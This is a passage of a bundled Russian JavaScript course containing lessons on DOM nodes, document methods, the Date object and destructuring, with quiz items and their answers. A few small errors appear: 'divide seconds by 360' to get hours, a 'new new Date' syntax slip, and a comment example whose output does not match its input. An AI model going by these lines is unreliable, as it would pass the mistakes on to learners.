document\n    timeStamp: 249903.10000014305\n    type: \"scroll\"\n  ► [[Prototype]]: Event\n~~~\n\nТак браузер обеспечивает нам доступ к событиям, позволяя каждому событию назначать функцию, которая будет вызвана при наступлении этого события.\nИ, как мы убедились, эта функция при вызове получит ссылку на объект события в качестве агрумента.\n\nКак видите, **даже события браузер моделирует для нас как объекты**.\n\n____________________________________________\n\n## ![ico-30 icon] Constructor Node\n\nЭтот конструктор принимает участие в создании всех объектов DOM, включая объект **~document~**.\n\nЭто означает, что свойства и методы, которые есть в его объекте **~prototype~**, \"наследуются\" экземплярами, т.е. объектами DOM.\n\n~~~js\nconsole.dir(Node.prototype)\n~~~\n\n~~~~console\n▼ Node\n    ATTRIBUTE_NODE: 2\n    CDATA_SECTION_NODE: 4\n    COMMENT_NODE: 8\n    DOCUMENT_FRAGMENT_NODE: 11\n    DOCUMENT_NODE: 9\n    DOCUMENT_POSITION_CONTAINED_BY: 16\n    DOCUMENT_POSITION_CONTAINS: 8\n    DOCUMENT_POSITION_DISCONNECTED: 1\n    DOCUMENT_POSITION_FOLLOWING: 4\n    DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC: 32\n    DOCUMENT_POSITION_PRECEDING: 2\n    DOCUMENT_TYPE_NODE: 10\n    ELEMENT_NODE: 1\n    ENTITY_NODE: 6\n    ENTITY_REFERENCE_NODE: 5\n    NOTATION_NODE: 12\n    PROCESSING_INSTRUCTION_NODE: 7\n    TEXT_NODE: 3\n  ► appendChild: ƒ appendChild()\n    baseURI: (...)\n    childNodes: (...)\n  ► cloneNode: ƒ cloneNode()\n  ► compareDocumentPosition: ƒ compareDocumentPosition()\n  ► contains: ƒ contains()\n    firstChild: (...)\n  ► getRootNode: ƒ getRootNode()\n  ► hasChildNodes: ƒ hasChildNodes()\n  ► insertBefore: ƒ insertBefore()\n    isConnected: (...)\n  ► isDefaultNamespace: ƒ isDefaultNamespace()\n  ► isEqualNode: ƒ isEqualNode()\n  ► isSameNode: ƒ isSameNode()\n    lastChild: (...)\n  ► lookupNamespaceURI: ƒ lookupNamespaceURI()\n  ► lookupPrefix: ƒ lookupPrefix()\n    nextSibling: (...)\n    nodeName: (...)\n    nodeType: (...)\n    nodeValue: (...)\n  ► normalize: ƒ normalize()\n    ownerDocument: (...)\n    parentElement: (...)\n    parentNode: (...)\n    previousSibling: (...)\n  ► removeChild: ƒ removeChild()\n  ► replaceChild: ƒ replaceChild()\n    textContent: (...)\n  ► constructor: ƒ Node()\n    Symbol(Symbol.toStringTag): \"Node\"\n  ► get baseURI: ƒ baseURI()\n  ► get childNodes: ƒ childNodes()\n  ► get firstChild: ƒ firstChild()\n  ► get isConnected: ƒ isConnected()\n  ► get lastChild: ƒ lastChild()\n  ► get nextSibling: ƒ nextSibling()\n  ► get nodeName: ƒ nodeName()\n  ► get nodeType: ƒ nodeType()\n  ► get nodeValue: ƒ nodeValue()\n  ► set nodeValue: ƒ nodeValue()\n  ► get ownerDocument: ƒ ownerDocument()\n  ► get parentElement: ƒ parentElement()\n  ► get parentNode: ƒ parentNode()\n  ► get previousSibling: ƒ previousSibling()\n  ► get textContent: ƒ textContent()\n  ► set textContent: ƒ textContent()\n  ► [[Prototype]]: EventTarget\n~~~~\n\n_________________________________________\n\n### ![ico-25 icon] Типы узлов дерева DOM\n\nПервое, что мы видим в прототайпе конструктора **~Node~** - это перечень констант.\n\nОбратим внимание на следующие константы:\n\n~~~console\nATTRIBUTE&lowbar;NODE: 2\nCDATA&lowbar;SECTION&lowbar;NODE: 4\nCOMMENT&lowbar;NODE: 8\nDOCUMENT&lowbar;FRAGMENT&lowbar;NODE: 11\nDOCUMENT&lowbar;NODE: 9\nDOCUMENT&lowbar;TYPE&lowbar;NODE: 10\nELEMENT&lowbar;NODE: 1\nPROCESSING&lowbar;INSTRUCTION&lowbar;NODE: 7\nTEXT&lowbar;NODE: 3\n~~~\n\n^^Константы **ENTITY&lowbar;REFERENCE&lowbar;NODE**, **ENTITY&lowbar;NODE** and **NOTATION&lowbar;NODE** устарели и больше не используются, поэтому мы не показываем их в этом списке.^^\n\nЭто **типы узлов дерева DOM**.\n\nЭлементы DOM имеют тип **ELEMENT&lowbar;NODE** с числовым значением 1.\nКак мы видим, есть также узлы комментариев (**COMMENT&lowbar;NODE**), текстовые узлы (**TEXT&lowbar;NODE**), узлы атрибутов (**ATTRIBUTE&lowbar;NODE**) и т.д.\n\nВсе узлы дерева DOM имеют свойство **~nodeType~** с числовым значением.\n\n~~~js\ndocument.nodeType\n~~~\n\n~~~console\n9\n~~~\n\n~~~js\ndocument.body.nodeType\n~~~\n\n~~~console\n1\n~~~\n_______________________________________\n\n### ![ico-25 icon] Node.prototype methods\n\nКак уже было сказано ранее, эти методы наследуют **все элементы DOM**, включая само объект **~document~**.\nВ данный момент нас интересуют два метода:\n\n~~~console\nappendChild: ƒ appendChild()\nremoveChild: ƒ removeChild()\n~~~\n\nИз названия методов понятно, что каждый элемент DOM может добавлять или удалять своих потомков.\nГлавное - иметь ссылку на потомка, который будет добавлен или удален.\n\nОба метода возвращают **ссылку** на добавленного/удаленного потомка.\n\nПредположим, что в переменной **~parent~** находится ссылка на родительский элемент, а в переменной **~elem~** - ссылка на элемент, который мы хотим вставить в контейнер **~parent~**.\n\nТогда после выполнения кода:\n\n~~~js\nparent.appendChild(elem)\n~~~\n\nэлемент **~elem~** окажется внутри элемента **~parent~**.\n\nЕсли **~elem~** был потомком другого родителя, то после выполнения этого кода он будет перемещен.\n\nНапример, пусть во вкладке **~Elements~** консоли мы видим такую картину:\n\n◘◘^^**Elements**^^◘◘\n~~~console\n&lt;body>\n  &lt;section>\n    &lt;p>&lt;/p>\n  &lt;/section>\n  &lt;figure>\n  &lt;/figure>\n&lt;/body>\n~~~\n\nпри этом в переменной **~figure~** у нас есть ссылка на элемент **~&lt;figure>~**, в переменной **~section~** - ссылка на элемент **~&lt;section>~**, а в переменной **~paragraph~** - ссылка на элемент **~&lt;p>~**.\n\nПосле выполнения кода:\n\n~~~js\nfigure.appendChild(paragraph)\n~~~\n\nнаша разметка (в) будет выглядеть уже иначе:\n\n◘◘^^**Elements**^^◘◘\n~~~console\n&lt;body>\n  &lt;section>&lt;/section>\n  &lt;figure>\n    &lt;p>&lt;/p>\n  &lt;/figure>\n&lt;/body>\n~~~\n\nПредположим, что в переменной **~parent~** находится ссылка на родительский элемент, а впеременной **~elem~** - ссылка на потомка элемента **~parent~**.\n\n~~~js\nparent.removeChild(elem)\n~~~\n\nПри удалении потомка удаляемый элемент будет доступен до тех пор, пока \"жива\" ссылка на него (переменная **~elem~**).\nЭто означает, что вы сможете в любой удобный момент вставить этот элемент туда, куда вам нужно.\n\n____________________________________________\n\n## ![ico-30 icon] Методы объекта document\n\nЕсть вещи, которые может делать только объект **~document~**.\nНе трудно догадаться, где искать эти методы.\nКакой конструктор есть в цепочке прототипов объекта **~document~**, и которого нет в цепочке прототипов других объектов DOM?\n\nА их у нас целых два, это конструкторы **~HTMLDocument~** и **~Document~**.\n\nОбъявим функцию **~getMethods~**, которую нужно вызывать в контексте объекта, имена методов которого мы ходим получить:\n\n◘◘ **^^getMethods^^** ◘◘\n\n~~~js\nfunction getMethods (search) {\n  const keys = Object.keys(this)\n  const funcNames = keys\n    .map(key => Object.getOwnPropertyDescriptor(this, key).value)\n    .map((value, index) => typeof value === 'function' ? keys[index] : null)\n    .filter(key => !!key && (search ? key.startsWith(search) : true))\n\n  return funcNames\n}\n~~~\n\nОбратите внимание, что мы заложили возможность фильтровать список методов, поскольку он обещает быть довольно длинным.\nФильтруя список методов, мы сможем разбить его на группы по назначению методов.\n\nЗаглянем в прототайп конструктора **~HTMLDocument~** и поищем там только функции (т.е. методы):\n\n~~~js\ngetMethods.call(HTMLDocument.prototype)\n~~~\n\nМы получим пустой массив. Действительно, загляните самостоятельно в **~HTMLDocument.prototype~** и убедитесь, что там только свойства.\n\nИщем дальше. Теперь заглянем в прототайп конструктора **~Document~**:\n\n~~~js\ngetMethods.call(Document.prototype)\n~~~\n\nЗдесь мы уже видим внушительный список методов, и самое время включить фильтр.\n\n### ![ico-25 icon] create\n\nПосмотрим, что наш хост-объект **~document~** умеет создавать:\n\n~~~js\ngetMethods.call(Document.prototype, 'create')\n~~~\n\n~~~~console\n▼ (15) ['createAttribute', 'createAttributeNS', 'createCDATASection', 'createComment', 'createDocumentFragment', 'createElement', 'createElementNS', 'createEvent', 'createExpression', 'createNSResolver', 'createNodeIterator', 'createProcessingInstruction', 'createRange', 'createTextNode', 'createTreeWalker']\n    0: \"createAttribute\"\n    1: \"createAttributeNS\"\n    2: \"createCDATASection\"\n    3: \"createComment\"\n    4: \"createDocumentFragment\"\n    5: \"createElement\"\n    6: \"createElementNS\"\n    7: \"createEvent\"\n    8: \"createExpression\"\n    9: \"createNSResolver\"\n    10: \"createNodeIterator\"\n    11: \"createProcessingInstruction\"\n    12: \"createRange\"\n    13: \"createTextNode\"\n    14: \"createTreeWalker\"\n    length: 15\n  ► [[Prototype]]: Array(0)\n~~~~\n\nПо списку методов, начинающихся со слова **create**, мы можем судить о том, какие возможности предоставляет нам баузер по динамическому добавлению новых объектов в DOM.\n![ico-25 warn] Это еще не означает, что созданные объекты будут вставлены на страницу.\nДля добавления узлов дерева DOM на страницу мы будем использовать метод **~appendChild~**, который у всех объектов DOM, поскольку унаследован от конструктора **Node**.\n\n#### ![ico-20 icon] document.createElement\n\nСоздает элемент DOM и возвращает ссылку на него.\n\nАргументом метода является строка, содержащая имя тега html-элемента (^^регистр не имеет значения^^).\nЕсли переданная строка не соответствует никакому тегу в спецификации языка html, то созданный элемент будет иметь класс **~HTMLUnknownElement~**.\n\n◘◘![ico-25 coffee] **createElement**◘◘\n\n~~~js\nvar div = document.createElement('div')\nconsole.log(div)\nconsole.log('Node type: ', div.nodeType)\nconsole.log('Tag name: ', div.tagName)\n~~~\n\n~~~html\n&lt;div>&lt;/div>\nNode type:  1\nTag name:  DIV\n~~~\n\n____________________________________________\n\n#### ![ico-20 icon] document.createTextNode\n\nЭтот метод создает текстовый узел и возвращает ссылку на него.\n\n◘◘![ico-25 coffee] **createTextNode**◘◘\n\n~~~js\nvar text = document.createTextNode('Text node')\nconsole.log('Node type: ', text.nodeType)\nconsole.log('Node value: ', text.nodeValue)\n~~~\n\n~~~console\nNode type:  3\nNode value:  Text node\n~~~\n\nЕсли этот узел вставить в тело документа, то текст будет отображен на странице, но, как вы понимаете, без какого-либо форматирования.\nПоэтому вставка текстовых узлов не используется непосредственно для вывода какого-либо текста юзеру, но может применяться для других целей.\n\n◘◘![ico-20 coffee] **Insert styles to document.head**◘◘\n\n~~~js\ndocument.head\n  .appendChild(document.createElement('style'))\n  .appendChild(document.createTextNode('div { color: blue; }'))\n~~~\n\n◘◘![ico-20 coffee] **Insert script to page**◘◘\n\n~~~js\nvar script = document.body\n  .appendChild(document.createElement('script'))\nscript.appendChild(document.createTextNode(`alert('Hello')`))\n~~~\n\n____________________________________________\n\n#### ![ico-20 icon] document.createComment\n\nЭтот метод создает узел комментария и возвращает ссылку на него.\n\n~~~js\nvar comment = document.createComment('Some comment will be here.')\nconsole.log(comment)\n~~~\n\n~~~console\n&lt;!--Some text will be here.--\x3e\n~~~\n____________________________________________\n\n#### ![ico-20 icon] document.createDocumentFragment\n\n◘◘^^function **addElem**^^◘◘\n~~~js\nfunction addElem (tagName = 'div', container = document.body) {\n  return container.appendChild(document.createElement(tagName))\n}\n~~~\n\n~~~js\nvar section = addElem('section')\nvar article = addElem('article')\n\nvar fragment = document.createDocumentFragment()\nfor (var item of ['name', 'hostory', 'speciality', 'hobby', 'city', 'job']) {\n  addElem('p', fragment).textContent = item\n}\n\nsection.appendChild(fragment)\nconsole.log(section)\n~~~\n\n~~~console\n&lt;section>\n  &lt;p>name&lt;/p>\n  &lt;p>hostory&lt;/p>\n  &lt;p>speciality&lt;/p>\n  &lt;p>hobby&lt;/p>\n  &lt;p>city&lt;/p>\n  &lt;p>job&lt;/p>\n&lt;/section>\n~~~\n_____________________________________________\n\n### ![ico-25 icon] Методы поиска элементов\n\nПосмотрим, что можно получить с помощью хост-объекта **~document~**:\n\n~~~js\ngetMethods.call(Document.prototype, 'get')\n~~~\n\n~~~~console\n▼ (7) ['getAnimations', 'getElementById', 'getElementsByClassName', 'getElementsByName', 'getElementsByTagName', 'getElementsByTagNameNS', 'getSelection']\n    0: \"getAnimations\"\n    1: \"getElementById\"\n    2: \"getElementsByClassName\"\n    3: \"getElementsByName\"\n    4: \"getElementsByTagName\"\n    5: \"getElementsByTagNameNS\"\n    6: \"getSelection\"\n    length: 7\n  ► [[Prototype]]: Array(0)\n~~~~\n\nКак мы видим, здесь представлены методы поиска элементов DOM по значениям аттрибутов или имени тега.\nМетоды **~getAnimations~** и **~getSelection~** мы пока затрагивать не будем.\n\nДля поиска элементов на странице у объекта **~document~** есть несколько методов:\n\n| ![ico-20 pin] | **document.getElementById**         | ^^Возвращает ссылку на элемент, найденный по его атрибуту **id**.^^ |\n| ![ico-20 pin] | **document.getElementsByTagName**   | ^^Возвращает коллекцию html-элементов (итерабельный объект класса **~HTMLCollection~**) по имени тега.^^ |\n| ![ico-20 pin] | **document.getElementsByClassName** | ^^Возвращает коллекцию html-элементов (итерабельный объект класса **~HTMLCollection~**) по имени класса.^^ |\n| ![ico-20 pin] | **document.getElementsByName**      | ^^Возвращает коллекцию html-элементов (итерабельный объект класса **~HTMLCollection~**) по значению аттрибута **~name~**.^^ |\n\n![ico-25 coffee] ** 1**\n\n◘◘Разметка◘◘\n\n~~~html\n&lt;body>\n   &lt;main name=\"main\">\n      &lt;section>\n         &lt;div class=\"content\">&lt;/div>\n         &lt;figure class=\"content\">&lt;/figure>\n      &lt;/section>\n   &lt;/main>\n&lt;/body>\n~~~\n\n◘◘^^JS^^◘◘\n\n~~~js\ndocument\n  .getElementsByName('main')[0]\n  .getElementsByTagName('section')[0]\n  .getElementsByClassName('content')\n~~~\n\n◘◘^^Результат:^^◘◘\n\n~~~console\n\n▼ HTMLCollection(2) [div.content, figure.content]\n  ► 0: div.content\n  ► 1: figure.content\n    length: 2\n  ► __proto__: HTMLCollection\n~~~\n\n____________________________________________\n\n![ico-25 coffee] ** 2**\n\nПерейдите [**ссылке**](external/css-trics-checked )\n\nОткройте консоль новой вкладки.\nВыполните код в консоли:\n\n~~~js\ndocument.getElementsByClassName('screen-reader-text', 'visually-hidden')\n~~~\n\nПолучив один раз ссылку на объект класса **HTMLCollection**, вы можете рассчитывать на то, что этот объект будет отображать актуальное состояние страницы, т.е. любые изменения в документе (удаление или добавление элементов) будут отображаться в вашем объекте класса **HTMLCollection**.\n\n____________________________________________\n\n#### ![ico-20 icon] append | remove\n\n_________________________________________\n\nКак видите, мы нашли конструктор, который обеспечивает объект **~document~** методами. И достаточно щедро.\nОднако не все эти методы рекомендуется использовать.\nПроверьте их сначала на [**MDN**](https://developer.mozilla.org/en-US/docs/Web/API/Document ).\n________________________________________\n\n### ![ico-25 icon] Методы поиска элементов\n\n______________________________________\n\n### ![ico-25 icon] element.querySelector\n\n^^Возвращает первый найденный элемент по указанному CSS-селектору^^\n^^Поиск осуществляется в пределах элемента, в контексте которого вызван метод (~element~)^^\n\n◘◘![ico-25 coffee] ** 3**◘◘\n\n~~~html\n&lt;body>\n  &lt;h3 id=\"demo\">demo&lt;/h3>\n  &lt;section>\n    &lt;div title=\"figure\">\n      figure\n    &lt;/div>\n    &lt;figure class=\"promoClass\">\n      promoClass\n    &lt;/figure>\n  &lt;/section>\n\n  &lt;input type=\"number\" />\n  &lt;input type=\"color\" />\n&lt;/body>\n~~~\n\n~~~js\nvar section = document.body.querySelector('section')\nconsole.dir(section)\nconsole.dir(document.querySelector('#demo'))\nconsole.dir(section.querySelector('.promoClass'))\nconsole.dir(document.body.querySelector('[type=\\'number\\']'))\nconsole.dir(section.querySelector('[title]'))\n~~~\n\n**Результат в консоли:**\n\n~~~console\n► section\n► h3#demo\n► figure.promoClass\n► input\n► div\n~~~\n\n______________________________________________\n\n### ![ico-25 icon] element.querySelectorAll\n\nВозвращает итерабельный объект класса **~NodeList~**, содержащий все элементы, соответствующие указанному селектору.\n\n![ico-25 coffee] ** 4**\n\nВернемся к предыдущему примеру и выполним следующий код:\n\n◘◘js◘◘\n~~~js\nsection.querySelectorAll('*')\n~~~\n\n◘◘Результат в консоли:◘◘\n~~~console\n▼ NodeList(2) [div, figure.promoClass]\n  ► 0: div\n  ► 1: figure.promoClass\n    length: 2\n  ► __proto__: NodeList\n~~~\n\n_________________________________________________\n\n## ![ico-30 hw] Тесты\n\n◘◘![ico-25 hw]** 1**◘◘\n~~~js\nvar elem = document.body\n  .appendChild(document.createElement('p'))\n\nelem.tagName = 'div'\n~~~\n\n→→→ Какой элемент появится в DOM? | p, div, 'будет сгенерировано исключение' | p→→→\n\n____________________________________________\n\n\n◘◘![ico-25 hw]** 2**◘◘\n~~~js\ndocument.title = 'DOM'\n~~~\n\n→→→ Что изменится после выполнения скрипта? | 'ничего', 'текст на странице', 'надпись на вкладке' | надпись на вкладке→→→\n\n_________________________________________________\n\n◘◘![ico-25 hw]** 3**◘◘\n~~~js\nvar paragraph = [\n  'BOM',\n  'DOM',\n  'HTMLElement',\n  'Browser Object Model'\n]\n\nfor (var text of paragraph) {\n  document.body\n    .appendChild(document.createElement('p'))\n    .innerHTML = text\n}\n~~~\n\n→→→ Сколько элементов будет добавлено на страницу? | 0, 3, 1, 4 | 4→→→\n\n_________________________________________\n\n◘◘![ico-25 hw]** 4**◘◘\n\n→→→ Какой тип данных у свойства innerHTML элемента DOM? | 'boolean', 'undefined', 'string', 'function', 'number', 'object' | string→→→\n\n_________________________________________________\n\n![ico-25 hw]** 5**\n\nВ консоли пустой страницы (about:blank) был выполнен код:\n\n~~~js\nvar paragraph = document.body\n  .appendChild(document.createElement('p'))\nparagraph.appendChild(document.createElement('span'))\n~~~\n\nА затем выполнена следующая строчка кода:\n\n~~~js\ndocument.write('<h3 style=\"color: #09b\">Hello!</h3>')\n~~~\n\n→→→ Сколько элементов находятся в теле документа? | 0, 1, 2, 3 | 1→→→\n\n_____________________________________________\n\n![ico-25 hw]** 6**\n\nВ консоли пустой страницы (about:blank) был выполнен код:\n\n~~~js\ndocument.write('<h3 style=\"color: #09b\">Hello!</h3>')\nvar paragraph = document.body\n  .appendChild(document.createElement('p'))\nparagraph.appendChild(document.createElement('span'))\n~~~\n\n→→→ Сколько элементов находятся в теле документа? | 0, 1, 2, 3 | 2→→→\n\n_____________________________________________\n\n![ico-25 hw]** 7**\n\nВ консоли пустой страницы (about:blank) был выполнен код:\n\n~~~js\ndocument.createElement('h3').innerHTML = 'Welcome'\ndocument.createElement('p').innerHTML = 'to JS'\ndocument.createElement('div')\n  .style = 'padding: 48px; border-radius: 50%; border: solid 2px #f0f;'\n~~~\n\n→→→ Сколько элементов появится в теле документа? | 0, 1, 2, 3 | 0→→→\n\n_____________________________________________\n\n![ico-25 hw]** 8**\n\nВ консоли пустой страницы (about:blank) был выполнен код:\n\n~~~js\nvar elems = ['h3', 'p', 'div'].map(tag => document.createElement(tag))\n\nelems.forEach(elem => document.body.appendChild(elem))\n\nelems[2].innerText = '\x3c!-- Comment --\x3e'\n\nfor (var elem of document.body.children) {\n  for (var node of elem.childNodes) console.log(node.nodeType)\n}\n~~~\n\n→→→ Что появится в консоли? | 1, 2, 3, 8, 9 | 3→→→\n\n_____________________________________________\n\n![ico-25 hw]** 9**\n\nВ консоли пустой страницы (about:blank) был выполнен код:\n\n~~~js\ndocument.head.innerHTML = `\x3c!-- Comment --\x3e`\nfor (var node of document.head.childNodes) console.log(node.nodeType)\n~~~\n\n→→→ Что появится в консоли? | 1, 2, 3, 8, 9 | 8→→→\n\n_____________________________________________\n\n◘◘![ico-25 hw] **10**◘◘\n\n~~~js\nfunction showProto (elem) {\n  var proto = elem.__proto__\n  var result = []\n  while (proto) {\n    result.push(proto.constructor.name)\n    proto = proto.__proto__\n  }\n  return { [elem.tagName]: result }\n}\n\nvar elems = ['p', 'img', 'a', 'div', 'input', 'style', 'script']\n\nelems.forEach(function (elem) {\n  console.log(showProto(document.createElement(elem)))\n})\n~~~\n\n→→→ Что итерирует функция showProto? | 'массив html-элементов', 'свойства html-элемента', 'цепочку прототипов html-элемента' | цепочку прототипов html-элемента→→→\n\n\n___________________________________\n\n[![ico-20 link] **^^Типы узлов дерева DOM^^**](external/w3-node-types)\n\n[![ico-20 link] **^^Document^^**](external/mdi-dom)\n"},73087:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 study] Date()\n\n\n## ![ico-25 icon] Конструктор\n\nСоздать объект даты и времени можно с помощью конструктора **Date()**\n\n~~~js\nvar myData = new Date(year,  month, day, hours, minutes, seconds, milliseconds)\n~~~\n\nКонструктор принимает аргументы: год, месяц, число, час, минуты, секунды (и миллисекунды)\n\n^^![ico-20 warn] нумерация месяцев начинается с 0 (январь - 0, февраль - 1 и т.д.)^^\n\nНо можно и проще:\n\n~~~js\nvar newData = new Date(год, месяц, число)\n~~~\n\n• Если вызвать конструктор без аргументов, будет создан объект даты с текущими значениями даты и времени\n\n• Если передать аргументы год, месяц и день месяца, то будет создан объект даты с указанным значением даты\n\n^^Например, в результате выполнения кода:^^\n\n~~~js\nvar newData = new Date(2017,  11,  10)\n~~~\n\n^^в переменной **newData**  будет:^^\n\n~~~js\nSun Dec 10 2017 00:00:00 GMT+0200 (Финляндия (зима))\n~~~\n\nПеременная  **newData**  является объектом\n\n~~~js\ntypeof  newData    // "object"\n~~~\n\nЭто экземпляр класса **Date**\n\n~~~js\nnewData instanceof Date    // true\n~~~\n\n^^т.е. создан конструктором Date()^^\n\n## ![ico-25 icon] Методы\n\nВсе экземпляры класса **Date** имеют ряд свойств и методов\n\n| Метод | Что возвращает |\n| ![ico-20 green-ok] **getDay()** | ^^порядковый номер дня недели (начиная с  0 - воскресенье)^^ |\n| ![ico-20 green-ok] **getFullYear()** | ^^год^^ |\n| ![ico-20 green-ok] **getMonth()** | ^^порядковый номер месяца (начиная с  0)^^ |\n| ![ico-20 green-ok] **getDate()** | ^^день месяца (начиная с  1)^^ |\n| ![ico-20 green-ok] **setDate()** | ^^установит день месяца, указанный аргументом^^ |\n| ![ico-20 green-ok] **setMonth()** | ^^установит месяц, указанный аргументом^^ |\n| ![ico-20 green-ok] **setYear()** | ^^установит год, указанный аргументом^^ |\n| ![ico-20 green-ok] **getHours()** | ^^часы^^ |\n| ![ico-20 green-ok] **getMinutes()** | ^^минуты^^ |\n| ![ico-20 green-ok] **getSeconds()** | ^^секунды^^ |\n\n[![ico-20 link] W3School](https://www.w3schools.com/js/js_date_methods.asp)\n[![ico-20 link] MDN](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/Date)\n\n______________________________________________\n\n![ico-25 cap] ** 1 **\n\n~~~js\nvar newData = new Date(2017,  11,  10)\nconsole.log(newData)\n// Sun Dec 10 2017 00:00:00 GMT+0200 (Восточная Европа, стандартное время)\n~~~\n\n### ![ico-25 icon] toLocaleString()\n\n![ico-25 cap] ** 2 **\n\n~~~js\nnewData.toLocaleString()    // "10.12.2017, 0:00:00"\nnewData.setHours(12)\nnewData.toLocaleString()    // "10.12.2017, 12:00:00"\nnewData.setMinutes(45)\nnewData.toLocaleString()    // "10.12.2017, 12:45:00"\nnewData.setSeconds(45)\nnewData.toLocaleString()    // "10.12.2017, 12:45:45"\nnewData.setDate(45)\nnewData.toLocaleString()    // "14.01.2018, 12:45:45"\n~~~\n\n![ico-25 cap] ** 3 **\n\n~~~js\nvar data = new Date(2019, 4, 24, 7, 20, 30)\n\ndata.toLocaleString().split(\', \')[0] // "24.05.2019"\ndata.toLocaleString().split(\', \')[1] // "07:20:30"\n~~~\n\nМожно получить сразу строку с датой с помощью метода **~toLocaleDateString()~**:\n\n~~~js\nnew new Date(2019, 4, 24, 7, 20, 30)\n  .toLocaleDateString()  // "24.05.2019"\n~~~\n\nили сразу строку времени с помощью метода **~toLocaleTimeString()~**:\n\n~~~js\nnew Date(2019, 4, 24, 7, 20, 30)\n  .toLocaleTimeString() // "07:20:30"\n~~~\n\n### ![ico-25 icon] setFullYear()\n\nЭтот метод удобен для вычисления нужной даты, поскольку принимает не только год, но также ему можно передать и месяц, и день месяца\n\nЕсли мы вызовем его с одним аргументом:\n\n~~~js\nvar data = new Date ( 2000, 10, 5 )\n\ndata.setFullYear ( 2019 )\n~~~\n\nто в переменной data будет изменен только год\n\nОднако можно использовать два дополнительных аргумента:\n\n![ico-25 cap] ** 4 **\n\n^^Вычислим дату, которая наступит через 50 дней после 24/05/2019:^^\n\n~~~js\nvar data = new Date(2019, 4, 24)\nconsole.log(`Current date: ${data.toLocaleString()}`)\ndata.setFullYear (data.getFullYear(), data.getMonth(), data.getDate() + 50)\nconsole.log(`Next date: ${data.toLocaleString()}`)\n~~~\n\n^^В консоли будет:^^\n\n~~~console\nCurrent date: 24.05.2019, 00:00:00\nNext date:    13.07.2019, 00:00:00\n~~~\n\n^^Завернем этот код в функцию:^^\n\n~~~js\nfunction calcDate (currentDate, days) {\n  var nextDate = currentDate\n  nextDate.setFullYear(currentDate.getFullYear(), currentDate.getMonth(), currentDate.getDate() + days)\n  return nextDate\n}\n~~~\n\nТеперь мы можем вычислять дату, которая будет через **days** дней от указанной **currentDate**\n\n^^Вызовем функцию:^^\n\n~~~js\ncalcDate(new Date(), 50)\n~~~\n\n_____________________________________________________\n\n### ![ico-25 icon] setDate()\n\n~~~js\nfunction getRelativeData (data, days) {\n  return !(data instanceof Date)\n    ? console.log(\'Invalid date\') || new Date()\n    : new Date(data.setDate(data.getDate() + days))\n}\n\ngetRelativeData(new Date(), 15)\n~~~\n\n{{{Date-constructor.js}}}\n\n\n_________________________________________________________\n\n### ![ico-25 icon] Разность дат\n\nВычислим, сколько дней осталось до дня рождения:\n\n~~~js\nvar birthday = new Date(1990, 11, 2)\n\nvar ms = birthday.setFullYear(new Date().getFullYear() ) - new Date()\nconsole.log(`До дня рождения осталось ${ms} миллисекунд`)\n\nvar hours = Math.round(ms / 3600000)\nconsole.log(`До дня рождения осталось ${hours} часов`)\n\nvar days = Math.round(hours / 24)\nconsole.log(`До дня рождения осталось ${days} дней`)\n~~~\n\n{{{Date-constructor-1.js}}}\n\nКак видите, для вычисления количества дней, оставшихся до указанной даты дня рождения мы сначала устанавливаем текущий год даты дня рождения\n\n~~~js\nbirthday.setFullYear(new Date().getFullYear())\n~~~\n\nЭто означает, что мы вычисляем оставшиеся до дня рождения дни в пределах текущего года\n\nМы вычисляем разность двух дат - даты дня рождения и текущей даты\n\n~~~js\nvar ms = birthday.setFullYear(new Date().getFullYear()) - new Date()\n~~~\n\nРезультат будет в миллисекундах\nРазделив результат на 1000, мы получим число секунд\nРазделив число секунд на 360, мы получим число часов\n\n~~~js\nvar hours = Math.round(ms / 3600000)\n~~~\n\nРазделив число часов на 24, мы получим число дней\n\n~~~js\nvar days = Math.round(hours / 24)\n~~~\n\nЕсли в этом году день рождения уже прошел, число дней будет отрицательным\n\n_________________________________________\n\n[![ico-30 hw] Упражнения](test/DateConstructor)\n'},5511:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 icon] Деструктуризация\n\n**ES6**\n\n_Деструктуризация - это разложение структуры данных на элементарные составляющие_\n\n**Структура данных** - это совокупность элементов, объединенных под одним именем и организованных по определенному принципу\n\nФактически структура данных - это именованная капсюла с четким протоколом доступа к ее содержимому:\n    в массиве - по индексу элемента массива,\n    в объекте - по имени свойства\n\nСтруктуру данных можно \"рассыпать\" в отдельные переменные\n\nЭто и есть **деструктуризация**\n\n![ico-20 warn] Как правило, при деструктуризации имеет место присваивание\n\nВ левой части оператора присваивания будет перечень переменных в квадратных или фигурных скобках ( в зависимости от того, что деструктурируем ), в правой - массив или объект, который мы деструктурируем\n\n_______________________________________________________________\n\n## ![ico-25 icon] Массивы\n\nПри деструктуризации массива переменные в левой части оператора присваивания должны перечисляться в **квадратных** скобках\n\n◘◘![ico-20 cap] 1◘◘\n\n~~~js\nconst fruits = ['банан', 'апельсин', 'киви']\nconst [var1, var2, var3] = fruits\n\nconsole.info(var1)   // \"банан\"\nconsole.info(var2)   // \"апельсин\"\nconsole.info(var3)   // \"киви\"\n\n// функция getArr возвращает массив\n\nconst getArr = deg => [Math.sin(deg), Math.cos(deg)]\n\n// Получим результат ее работы в переменные  sin30  и  cos30\n\nconst [sin30, cos30] = getArr(Math.PI/3)\n\nconsole.info(sin30)  // 0.8660254037844386\nconsole.info(cos30)  // 0.5\n~~~\n\n___________________________________________________________\n\n### ![ico-20 icon] Обмен значениями\n\n(деструктурирующее присваивание)\n\nДеструктуризация позволяет одной строкой выполнить обмен значениями между переменными:\n\n◘◘![ico-20 cap] 2◘◘\n\n~~~js\nlet x = 5, y = 7, z = 9;\n\n[x, y, z] = [y, z, x];\n\nconsole.info(x)  // 7\nconsole.info(y)  // 9\nconsole.info(z)  // 5\n~~~\n\n___________________________________________________________\n\n### ![ico-20 icon] Выборка отдельных значений из массива\n\nПусть функция **_getAngleData_** возвращает массив\n\nВызовем эту функцию, но \"пропустим\" возвращаемое ею значение тангенса угла:\n\n◘◘![ico-20 cap] 3◘◘\n\n~~~js\nconst getAngleData = deg => ([\n  Math.sin(deg),\n  Math.cos(deg),\n  Math.tan(deg),\n  Math.atan(deg)\n])\n\nconst [sin30, cos30, , arctg30] = getAngleData(Math.PI/3)\n\nconsole.info(sin30)  // 0.8660254037844386\nconsole.info(cos30)  // 0.5\nconsole.info(arctg30)  // 0.808448792630022\n~~~\n\n~~~js\nconst calcAngleData = (funcs => deg => funcs.map(func => 